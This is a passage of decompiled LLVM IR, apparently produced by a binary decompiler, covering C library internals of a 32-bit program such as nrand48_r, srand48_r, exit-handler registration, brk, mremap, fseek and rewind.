  store i32 %v1_8065649, i32* %eax.global-to-local, align 4
  store i32 %v1_8065649, i32* @ebx, align 4
  %v1_8065653 = icmp eq i32 %v1_8065649, 0
  br i1 %v1_8065653, label %dec_label_pc_8065679, label %dec_label_pc_8065657

dec_label_pc_8065657:                             ; preds = %dec_label_pc_806563e
  %v1_806565c = add i32 %v1_8065409, -8
  store i32 %v1_806565c, i32* %eax.global-to-local, align 4
  store i32 %v1_8065649, i32* %stack_var_-60, align 4
  %v3_8065665 = inttoptr i32 %v1_8065649 to i16*
  %v4_8065665 = call i32 @memcpy(i16* %v3_8065665, i32 %tmp7, i32 %v1_806565c)
  store i32 %v4_8065665, i32* %eax.global-to-local, align 4
  store i32 %v1_8065649, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_806566f = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8065674

dec_label_pc_8065674:                             ; preds = %dec_label_pc_8065544, %dec_label_pc_8065657
  %storemerge = phi i32 [ %v1_806566f, %dec_label_pc_8065657 ], [ %v1_806554e, %dec_label_pc_8065544 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065681

dec_label_pc_8065679:                             ; preds = %dec_label_pc_806563e, %dec_label_pc_80654a8
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8065681

dec_label_pc_806567d:                             ; preds = %dec_label_pc_8065635, %dec_label_pc_80655ad, %dec_label_pc_8065447
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8065681

dec_label_pc_8065681:                             ; preds = %dec_label_pc_8065679, %dec_label_pc_8065674, %dec_label_pc_8065630, %dec_label_pc_80655a5, %dec_label_pc_806567d
  store i32 %v2_80653b6, i32* %eax.global-to-local, align 4
  store i32 %v2_80653b6, i32* %stack_var_-60, align 4
  %v3_806568a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_806568a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806568f

dec_label_pc_806568f:                             ; preds = %dec_label_pc_806539a, %dec_label_pc_8065386, %dec_label_pc_8065681
  br label %dec_label_pc_8065692

dec_label_pc_8065692:                             ; preds = %dec_label_pc_80653d4, %dec_label_pc_806568f
  %v0_8065695 = load i32, i32* @ebx, align 4
  store i32 %v0_8065695, i32* %eax.global-to-local, align 4
  store i32 %v0_8065377, i32* @ebx, align 4
  store i32 %v0_8065376, i32* @esi, align 4
  store i32 %v0_8065375, i32* @edi, align 4
  store i32 %v0_8065374, i32* @ebp, align 4
  ret i32 %v0_8065695

; uselistorder directives
  uselistorder i32 %v1_8065649, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_806561d, { 1, 0, 2 }
  uselistorder i32 %v2_8065605, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v6_80655e9, { 1, 0, 2 }
  uselistorder i32 %v2_80655e3, { 1, 0, 2 }
  uselistorder i32 %v1_80655be, { 1, 0, 2 }
  uselistorder i32 %v3_80655bb, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8065579, { 1, 0 }
  uselistorder i32 %v1_80654df, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80654b3, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8065457, { 1, 0, 2 }
  uselistorder i32 %v3_806546a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8065427, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8065409, { 13, 14, 12, 15, 1, 0, 7, 11, 2, 10, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8065401, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_80653f6, { 1, 0 }
  uselistorder i32 %v1_80653e6, { 0, 2, 1 }
  uselistorder i32 %v0_80653cf, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 40, 43, 44, 45, 46, 0, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 ()* @abort, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 -2, { 56, 4, 9, 0, 53, 54, 2, 52, 58, 57, 5, 7, 6, 3, 51, 64, 1, 10, 11, 12, 55, 59, 60, 61, 62, 63, 13, 14, 15, 16, 17, 18, 19, 8, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* @global_var_807e64c.733, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8074750.648 to i32), { 4, 11, 0, 5, 1, 6, 2, 7, 12, 3, 8, 9, 10 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8065692, { 1, 0 }
  uselistorder label %dec_label_pc_806568f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8065681, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8065674, { 1, 0 }
  uselistorder label %dec_label_pc_8065630, { 1, 0 }
  uselistorder label %dec_label_pc_806561d, { 1, 0 }
  uselistorder label %dec_label_pc_80655a5, { 1, 0 }
  uselistorder label %dec_label_pc_8065558, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8065544, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_806549d, { 1, 0 }
  uselistorder label %dec_label_pc_80653fd, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_80656a9 = inttoptr i32 %arg2 to i32*
  %v4_80656a9 = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_80656a9)
  ret i32 %v4_80656a9
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80656b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80656b4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80656c1 = inttoptr i32 %arg1 to i16*
  %v3_80656c1 = call i32 @__drand48_iterate(i16* %v2_80656c1, i32 %arg2)
  %v2_80656cc = icmp slt i32 %v3_80656c1, 0
  br i1 %v2_80656cc, label %dec_label_pc_80656eb, label %dec_label_pc_80656d0

dec_label_pc_80656d0:                             ; preds = %entry
  %v0_80656d0 = load i32, i32* @ebx, align 4
  %v1_80656d0 = add i32 %v0_80656d0, 4
  %v2_80656d0 = inttoptr i32 %v1_80656d0 to i16*
  %v3_80656d0 = load i16, i16* %v2_80656d0, align 2
  %v4_80656d0 = zext i16 %v3_80656d0 to i32
  %v2_80656d4 = mul nuw i32 %v4_80656d0, 32768
  %v1_80656d7 = add i32 %v0_80656d0, 2
  %v2_80656d7 = inttoptr i32 %v1_80656d7 to i16*
  %v3_80656d7 = load i16, i16* %v2_80656d7, align 2
  %v3_80656db = udiv i16 %v3_80656d7, 2
  %v9_80656db = zext i16 %v3_80656db to i32
  %v2_80656e1 = or i32 %v9_80656db, %v2_80656d4
  store i32 %v2_80656e1, i32* %arg3, align 4
  br label %dec_label_pc_80656eb

dec_label_pc_80656eb:                             ; preds = %entry, %dec_label_pc_80656d0
  %v0_80656eb = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80656d0 ]
  %v2_80656ef = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80656ef, i32* @ebx, align 4
  ret i32 %v0_80656eb

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80656eb, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_80656f4 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_80656fe = sdiv i32 %v4_80656f4, 65536
  store i32 %v2_80656fe, i32* @ecx, align 4
  %v3_8065701 = add i32 %arg2, 2
  %v4_8065701 = inttoptr i32 %v3_8065701 to i16*
  store i16 %arg1, i16* %v4_8065701, align 2
  %v0_8065707 = load i32, i32* @ecx, align 4
  %v1_8065707 = trunc i32 %v0_8065707 to i16
  %v2_8065707 = load i32, i32* %edx.global-to-local, align 4
  %v3_8065707 = add i32 %v2_8065707, 4
  %v4_8065707 = inttoptr i32 %v3_8065707 to i16*
  store i16 %v1_8065707, i16* %v4_8065707, align 2
  %v0_806570b = load i32, i32* %edx.global-to-local, align 4
  %v1_806570b = inttoptr i32 %v0_806570b to i16*
  store i16 13070, i16* %v1_806570b, align 2
  %v0_8065710 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065710 = add i32 %v0_8065710, 16
  %v2_8065710 = inttoptr i32 %v1_8065710 to i32*
  store i32 -554899859, i32* %v2_8065710, align 4
  %v0_8065717 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065717 = add i32 %v0_8065717, 20
  %v2_8065717 = inttoptr i32 %v1_8065717 to i32*
  store i32 5, i32* %v2_8065717, align 4
  %v0_806571e = load i32, i32* %edx.global-to-local, align 4
  %v1_806571e = add i32 %v0_806571e, 12
  %v2_806571e = inttoptr i32 %v1_806571e to i16*
  store i16 11, i16* %v2_806571e, align 2
  %v0_8065724 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065724 = add i32 %v0_8065724, 14
  %v2_8065724 = inttoptr i32 %v1_8065724 to i16*
  store i16 1, i16* %v2_8065724, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_806572c = load i32, i32* @ebx, align 4
  store i32 %v0_806572c, i32* %stack_var_-4, align 4
  %v0_80657711724 = load i32, i32* @global_var_807d298.833, align 8
  %v0_80657761825 = load i32, i32* @global_var_807d29c.835, align 4
  %v1_806577c1926 = icmp eq i32 %v0_80657711724, 0
  %v1_806577e2027 = icmp eq i1 %v1_806577c1926, false
  br i1 %v1_806577e2027, label %dec_label_pc_8065736.lr.ph, label %dec_label_pc_8065780

dec_label_pc_8065736:                             ; preds = %dec_label_pc_8065736.lr.ph, %dec_label_pc_8065771.backedge
  %v0_806577121 = phi i32 [ %v0_80657711729, %dec_label_pc_8065736.lr.ph ], [ %v1_8065736, %dec_label_pc_8065771.backedge ]
  %v1_8065736 = add i32 %v0_806577121, -1
  store i32 %v1_8065736, i32* @global_var_807d298.833, align 8
  %v2_806573c = mul i32 %v1_8065736, 16
  %v2_806573f = add i32 %v0_80657761830, %v2_806573c
  %v1_8065742 = inttoptr i32 %v2_806573f to i32*
  %v2_8065742 = load i32, i32* %v1_8065742, align 4
  %v9_8065744 = icmp eq i32 %v2_8065742, 2
  br i1 %v9_8065744, label %dec_label_pc_8065750, label %dec_label_pc_8065749

dec_label_pc_8065749:                             ; preds = %dec_label_pc_8065736
  %v9_8065749 = icmp eq i32 %v2_8065742, 3
  %v1_806574c = icmp eq i1 %v9_8065749, false
  br i1 %v1_806574c, label %dec_label_pc_8065771.backedge, label %dec_label_pc_806575f

dec_label_pc_8065771.backedge:                    ; preds = %dec_label_pc_8065749, %dec_label_pc_8065750, %dec_label_pc_806575f
  %v1_806577c = icmp eq i32 %v1_8065736, 0
  %v1_806577e = icmp eq i1 %v1_806577c, false
  br i1 %v1_806577e, label %dec_label_pc_8065736, label %dec_label_pc_8065771.dec_label_pc_8065780_crit_edge

dec_label_pc_8065750:                             ; preds = %dec_label_pc_8065736
  %v1_8065750 = add i32 %v2_806573f, 4
  %v2_8065750 = inttoptr i32 %v1_8065750 to i32*
  %v3_8065750 = load i32, i32* %v2_8065750, align 4
  %v1_8065753 = icmp eq i32 %v3_8065750, 0
  br i1 %v1_8065753, label %dec_label_pc_8065771.backedge, label %dec_label_pc_8065757

dec_label_pc_8065757:                             ; preds = %dec_label_pc_8065750
  br label %dec_label_pc_806576c

dec_label_pc_806575f:                             ; preds = %dec_label_pc_8065749
  %v1_806575f = add i32 %v2_806573f, 4
  %v2_806575f = inttoptr i32 %v1_806575f to i32*
  %v3_806575f = load i32, i32* %v2_806575f, align 4
  %v1_8065762 = icmp eq i32 %v3_806575f, 0
  br i1 %v1_8065762, label %dec_label_pc_8065771.backedge, label %dec_label_pc_8065766

dec_label_pc_8065766:                             ; preds = %dec_label_pc_806575f
  br label %dec_label_pc_806576c

dec_label_pc_806576c:                             ; preds = %dec_label_pc_8065757, %dec_label_pc_8065766
  %v4_806576c = phi i32 [ %v3_806575f, %dec_label_pc_8065766 ], [ %v3_8065750, %dec_label_pc_8065757 ]
  call void @__pseudo_call(i32 %v4_806576c)
  %v0_806577117 = load i32, i32* @global_var_807d298.833, align 8
  %v0_806577618 = load i32, i32* @global_var_807d29c.835, align 4
  %v1_806577c19 = icmp eq i32 %v0_806577117, 0
  %v1_806577e20 = icmp eq i1 %v1_806577c19, false
  br i1 %v1_806577e20, label %dec_label_pc_8065736.lr.ph, label %dec_label_pc_8065780

dec_label_pc_8065736.lr.ph:                       ; preds = %entry, %dec_label_pc_806576c
  %v0_80657761830 = phi i32 [ %v0_806577618, %dec_label_pc_806576c ], [ %v0_80657761825, %entry ]
  %v0_80657711729 = phi i32 [ %v0_806577117, %dec_label_pc_806576c ], [ %v0_80657711724, %entry ]
  br label %dec_label_pc_8065736

dec_label_pc_8065771.dec_label_pc_8065780_crit_edge: ; preds = %dec_label_pc_8065771.backedge
  br label %dec_label_pc_8065780

dec_label_pc_8065780:                             ; preds = %entry, %dec_label_pc_806576c, %dec_label_pc_8065771.dec_label_pc_8065780_crit_edge
  %v0_8065776.lcssa = phi i32 [ %v0_80657761830, %dec_label_pc_8065771.dec_label_pc_8065780_crit_edge ], [ %v0_80657761825, %entry ], [ %v0_806577618, %dec_label_pc_806576c ]
  %v2_8065786 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8065786, i32* @ebx, align 4
  %v1_8065787 = call i32 @free(i32 %v0_8065776.lcssa)
  ret i32 %v1_8065787

; uselistorder directives
  uselistorder i32 %v2_806573f, { 1, 0, 2 }
  uselistorder i32 %v1_8065736, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8065780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8065736.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_806576c, { 1, 0 }
  uselistorder label %dec_label_pc_8065771.backedge, { 2, 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v2_806579a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_806579a, i32* %stack_var_-44, align 4
  %v4_806579f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134585853, i32 ptrtoint (i32* @global_var_8074840.761 to i32))
  store i32 ptrtoint (i32* @global_var_8074840.761 to i32), i32* %stack_var_-44, align 4
  %v1_80657ab = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074840.761 to i32))
  %v0_80657b0 = load i32, i32* @global_var_807d298.833, align 8
  %v0_80657b5 = load i32, i32* @global_var_807d2a0.836, align 32
  %v1_80657bb = add i32 %v0_80657b0, 1
  %v5_80657c1 = icmp slt i32 %v0_80657b5, %v1_80657bb
  br i1 %v5_80657c1, label %dec_label_pc_80657c3, label %entry.dec_label_pc_80657fc_crit_edge

entry.dec_label_pc_80657fc_crit_edge:             ; preds = %entry
  %v1_8065816.pre = load i32, i32* @global_var_807d29c.835, align 4
  br label %dec_label_pc_80657fc

dec_label_pc_80657c3:                             ; preds = %entry
  %v2_80657c3 = mul i32 %v0_80657b5, 16
  %v1_80657c8 = add i32 %v2_80657c3, 320
  %v0_80657cf = load i32, i32* @global_var_807d29c.835, align 4
  store i32 %v0_80657cf, i32* %stack_var_-44, align 4
  %v4_80657d5 = inttoptr i32 %v0_80657cf to i32*
  %v5_80657d5 = call i32 @realloc(i32* %v4_80657d5, i32 %v1_80657c8, i32 %v1_80657bb, i32 %v1_80657bb)
  store i32 %v5_80657d5, i32* @ebx, align 4
  %v1_80657df = icmp eq i32 %v5_80657d5, 0
  %v1_80657e1 = icmp eq i1 %v1_80657df, false
  br i1 %v1_80657e1, label %dec_label_pc_80657f0, label %dec_label_pc_80657e3

dec_label_pc_80657e3:                             ; preds = %dec_label_pc_80657c3
  %v0_80657e3 = load i32, i32* %stack_var_-44, align 4
  %v1_80657e3 = call i32 @__errno_location(i32 %v0_80657e3)
  %v1_80657e8 = inttoptr i32 %v1_80657e3 to i32*
  store i32 12, i32* %v1_80657e8, align 4
  br label %dec_label_pc_8065822

dec_label_pc_80657f0:                             ; preds = %dec_label_pc_80657c3
  %v0_80657f0 = load i32, i32* @global_var_807d2a0.836, align 32
  %v1_80657f0 = add i32 %v0_80657f0, 20
  store i32 %v1_80657f0, i32* @global_var_807d2a0.836, align 32
  store i32 %v5_80657d5, i32* @global_var_807d29c.835, align 4
  %v0_80657fc.pre = load i32, i32* @global_var_807d298.833, align 8
  br label %dec_label_pc_80657fc

dec_label_pc_80657fc:                             ; preds = %entry.dec_label_pc_80657fc_crit_edge, %dec_label_pc_80657f0
  %v1_8065816 = phi i32 [ %v1_8065816.pre, %entry.dec_label_pc_80657fc_crit_edge ], [ %v5_80657d5, %dec_label_pc_80657f0 ]
  %v0_80657fc = phi i32 [ %v0_80657b0, %entry.dec_label_pc_80657fc_crit_edge ], [ %v0_80657fc.pre, %dec_label_pc_80657f0 ]
  store i32 134633260, i32* @global_var_807d124.762, align 4
  %v1_806580d = add i32 %v0_80657fc, 1
  %v2_806580e = mul i32 %v0_80657fc, 16
  store i32 %v1_806580d, i32* @global_var_807d298.833, align 8
  %v2_8065816 = add i32 %v2_806580e, %v1_8065816
  store i32 %v2_8065816, i32* @ebx, align 4
  %v1_806581c = inttoptr i32 %v2_8065816 to i32*
  store i32 1, i32* %v1_806581c, align 4
  br label %dec_label_pc_8065822

dec_label_pc_8065822:                             ; preds = %dec_label_pc_80657e3, %dec_label_pc_80657fc
  store i32 %v2_806579a, i32* %stack_var_-44, align 4
  %v3_806582b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v0_8065830 = load i32, i32* @ebx, align 4
  ret i32 %v0_8065830

; uselistorder directives
  uselistorder i32 %v5_80657d5, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 1, 0 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_807d29c.835, { 3, 4, 2, 1, 0 }
  uselistorder i32* @global_var_807d298.833, { 3, 2, 4, 1, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074840.761 to i32), { 2, 4, 0, 3, 1 }
  uselistorder label %dec_label_pc_8065822, { 1, 0 }
  uselistorder label %dec_label_pc_80657fc, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8065838 = load i32, i32* @eax, align 4
  %v1_8065838 = add i32 %v0_8065838, 28
  %v2_8065838 = inttoptr i32 %v1_8065838 to i32*
  %v3_8065838 = load i32, i32* %v2_8065838, align 4
  store i32 %v3_8065838, i32* @global_var_807ea68.837, align 8
  %v1_8065841 = add i32 %v0_8065838, 44
  %v2_8065841 = inttoptr i32 %v1_8065841 to i32*
  %v3_8065841 = load i32, i32* %v2_8065841, align 4
  store i32 %v3_8065841, i32* @global_var_807ea6c.838, align 4
  ret i32 %v3_8065841
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806584c = load i32, i32* @ebx, align 4
  store i32 %v0_806584c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_806585f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_806585f, i32* @global_var_807d2a4.783, align 4
  %v7_806586a = icmp ult i32 %v1_806585f, %arg1
  %v1_806586c = icmp eq i1 %v7_806586a, false
  br i1 %v1_806586c, label %dec_label_pc_806587c, label %dec_label_pc_806586e

dec_label_pc_806586e:                             ; preds = %entry
  %v0_806586e = load i32, i32* %stack_var_-4, align 4
  %v1_806586e = call i32 @__errno_location(i32 %v0_806586e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8065876 = inttoptr i32 %v1_806586e to i32*
  store i32 12, i32* %v1_8065876, align 4
  %v0_806587c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806587c

dec_label_pc_806587c:                             ; preds = %entry, %dec_label_pc_806586e
  %v0_806587c = phi i32 [ 0, %entry ], [ %v0_806587c.pre, %dec_label_pc_806586e ]
  %v2_8065880 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8065880, i32* @ebx, align 4
  ret i32 %v0_806587c

; uselistorder directives
  uselistorder i32 %v1_806585f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_807d2a4.783, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806587c, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @edx, align 4
  %v1_806588d = inttoptr i32 %tmp2 to i32*
  %v2_806588d = load i32, i32* %v1_806588d, align 4
  %tmp5 = icmp ult i32 %v2_806588d, 12
  br i1 %tmp5, label %dec_label_pc_80658b9, label %dec_label_pc_8065894

dec_label_pc_8065894:                             ; preds = %entry
  %v1_8065894 = add i32 %v2_806588d, 3
  %v1_8065897 = and i32 %v1_8065894, -4
  %v2_806589a = add i32 %v1_8065897, %tmp2
  %v1_806589d = add i32 %tmp, 20
  %v2_806589d = inttoptr i32 %v1_806589d to i32*
  %v3_806589d = load i32, i32* %v2_806589d, align 4
  %v2_80658a0 = add i32 %tmp, 16
  %v3_80658a0 = inttoptr i32 %v2_80658a0 to i32*
  %v4_80658a0 = load i32, i32* %v3_80658a0, align 4
  %v5_80658a0 = add i32 %v4_80658a0, %v3_806589d
  store i32 %v5_80658a0, i32* @edx, align 4
  %v1_80658a3 = add i32 %v2_806589a, 12
  %v6_80658a8 = icmp ugt i32 %v1_80658a3, %v5_80658a0
  br i1 %v6_80658a8, label %dec_label_pc_80658b9, label %dec_label_pc_80658aa

dec_label_pc_80658aa:                             ; preds = %dec_label_pc_8065894
  %v1_80658aa = inttoptr i32 %v2_806589a to i32*
  %v2_80658aa = load i32, i32* %v1_80658aa, align 4
  %v1_80658ac = add i32 %v2_80658aa, 3
  %v1_80658af = and i32 %v1_80658ac, -4
  %v2_80658b2 = add i32 %v1_80658af, %v2_806589a
  %tmp6 = icmp ugt i32 %v2_80658b2, %v5_80658a0
  br i1 %tmp6, label %dec_label_pc_80658b9, label %dec_label_pc_80658bb

dec_label_pc_80658b9:                             ; preds = %dec_label_pc_80658aa, %dec_label_pc_8065894, %entry
  br label %dec_label_pc_80658bb

dec_label_pc_80658bb:                             ; preds = %dec_label_pc_80658aa, %dec_label_pc_80658b9
  %v0_80658bb = phi i32 [ %v2_806589a, %dec_label_pc_80658aa ], [ 0, %dec_label_pc_80658b9 ]
  ret i32 %v0_80658bb

; uselistorder directives
  uselistorder i32 %v2_806589a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_806588d, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80658bb, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80658c0 = load i32, i32* @edi, align 4
  %v0_80658c1 = load i32, i32* @esi, align 4
  store i32 %v0_80658c1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80658d9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80658e1 = call i32 @mremap(i32 %v0_80658d9, i32 %v0_80658c1, i32 %v0_80658c0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_80658d9, i32* @ebx, align 4
  store i32 %v6_80658e1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_80658e1, -4095
  br i1 %tmp, label %dec_label_pc_80658f9, label %dec_label_pc_80658ed

dec_label_pc_80658ed:                             ; preds = %entry
  %v1_80658ed = call i32 @__errno_location(i32 %v0_80658d9)
  %v0_80658f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80658f2 = sub i32 0, %v0_80658f2
  %v2_80658f4 = inttoptr i32 %v1_80658ed to i32*
  store i32 %v1_80658f2, i32* %v2_80658f4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80658f9

dec_label_pc_80658f9:                             ; preds = %entry, %dec_label_pc_80658ed
  %v0_80658f9 = phi i32 [ %v6_80658e1, %entry ], [ -1, %dec_label_pc_80658ed ]
  %v2_80658fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80658fc, i32* @esi, align 4
  store i32 %v0_80658c0, i32* @edi, align 4
  ret i32 %v0_80658f9

; uselistorder directives
  uselistorder i32 %v6_80658e1, { 1, 0, 2 }
  uselistorder i32 %v0_80658d9, { 1, 0, 2 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 54, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80658f9, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_806590b = ashr i32 %arg2, 31
  %v4_8065912 = inttoptr i32 %arg1 to i16*
  %v5_8065912 = call i32 @__GI_fseeko64(i16* %v4_8065912, i32 %arg2, i32 %v1_806590b, i32 %arg3)
  ret i32 %v5_8065912
}

define i32 @__GI_rewind(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_806591c = load i32, i32* @edi, align 4
  %v0_806591e = load i32, i32* @ebx, align 4
  %v4_8065922 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8065922, i32* @esi, align 4
  %v1_8065926 = add i32 %v4_8065922, 52
  %v2_8065926 = inttoptr i32 %v1_8065926 to i32*
  %v3_8065926 = load i32, i32* %v2_8065926, align 4
  store i32 %v3_8065926, i32* @edi, align 4
  %v1_8065929 = icmp eq i32 %v3_8065926, 0
  %v1_806592b = icmp eq i1 %v1_8065929, false
  br i1 %v1_806592b, label %entry.dec_label_pc_806594c_crit_edge, label %dec_label_pc_806592d

entry.dec_label_pc_806594c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_806594c

dec_label_pc_806592d:                             ; preds = %entry
  %v1_806592d = add i32 %v4_8065922, 56
  store i32 %v1_806592d, i32* @ebx, align 4
  %v5_806593c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 %v1_806592d)
  %v0_8065941 = load i32, i32* @ebx, align 4
  %v2_8065944 = call i32 @pthread_mutex_lock(i32 %v0_8065941)
  %v0_806594c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806594c

dec_label_pc_806594c:                             ; preds = %entry.dec_label_pc_806594c_crit_edge, %dec_label_pc_806592d
  %v10_806594c = phi i32 [ %v4_8065922, %entry.dec_label_pc_806594c_crit_edge ], [ %v0_806594c.pre, %dec_label_pc_806592d ]
  %v1_806594c = inttoptr i32 %v10_806594c to i16*
  %v2_806594c = load i16, i16* %v1_806594c, align 2
  %v3_806594c = and i16 %v2_806594c, -9
  store i16 %v3_806594c, i16* %v1_806594c, align 2
  %v0_8065950 = load i32, i32* @edx, align 4
  %v0_8065955 = load i32, i32* @esi, align 4
  %v5_8065956 = call i32 @__GI_fseek(i32 %v0_8065955, i32 0, i32 0, i32 %v0_8065950)
  br i1 %v1_806592b, label %dec_label_pc_8065973, label %dec_label_pc_8065962

dec_label_pc_8065962:                             ; preds = %dec_label_pc_806594c
  %v4_806596b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_8065973

